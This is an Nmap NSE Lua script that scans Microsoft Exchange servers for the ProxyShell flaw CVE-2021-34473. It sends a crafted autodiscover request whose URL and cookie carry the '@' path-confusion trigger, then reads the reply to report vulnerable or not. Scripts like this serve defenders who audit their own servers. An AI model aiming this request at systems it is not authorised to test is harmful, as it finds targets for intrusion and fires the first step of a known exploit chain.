--[[

/$$                     /$$
|__/                    | $$
 /$$  /$$$$$$   /$$$$$$$| $$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$$   /$$$$$$
| $$ /$$__  $$ /$$_____/| $$__  $$ /$$__  $$| $$  | $$| $$__  $$ /$$__  $$
| $$| $$  \ $$|  $$$$$$ | $$  \ $$| $$  \__/| $$  | $$| $$  \ $$| $$  \ $$
| $$| $$  | $$ \____  $$| $$  | $$| $$      | $$  | $$| $$  | $$| $$  | $$
| $$| $$$$$$$/ /$$$$$$$/| $$$$$$$/| $$      |  $$$$$$/| $$  | $$|  $$$$$$/
|__/| $$____/ |_______/ |_______/ |__/       \______/ |__/  |__/ \______/
    | $$
    | $$
    |__/
--]]

local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"

description = [[
Check for Microsoft Exchange servers potentially vulnerable CVE-2021-34473.
References:
https://nvd.nist.gov/vuln/detail/CVE-2021-34473
https://www.tenable.com/blog/proxyshell-attackers-actively-scanning-for-vulnerable-microsoft-exchange-servers-cve-2021-34473
https://www.rapid7.com/db/vulnerabilities/msft-cve-2021-34473/
https://github.com/phamphuqui1998/CVE-2021-34473
]]


-- @usage
-- nmap --script cve202134473.nse -p443 <host>

author = "Bruno da Silva (ipsbruno)"
license = "GPLv3"
categories = {"default", "discovery", "safe"}
portrule = shortport.http

local function CheckVuln(host,port)

    payload = '/autodiscover/autodiscover.json?a=e@e.com/autodiscover/autodiscover.xml'
    payload_data = '<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>e@e.com</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>'

    local options = {header={}}

    options["redirect_ok"] = false
    options["header"]["User-Agent"] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
    options["header"]["Cookie"] = 'Email=autodiscover/autodiscover.json?a=e@e.com'
    options["header"]["Content-Type"] = 'text/xml'

    response = http.post(host,port,payload,options, 1, payload_data)

    if  response.status == 200 and (string.match(response.body, 'The email address can')) then
        return 'VULNERABLE_YES'
    else
        return 'VULNERABLE_NO'
    end

end


action = function(host, port)
    local response = stdnse.output_table()
    response["Exchange"] = CheckVuln(host,port) ..  '|' .. string.format("%s",host.ip) .. '|'
    return response
end
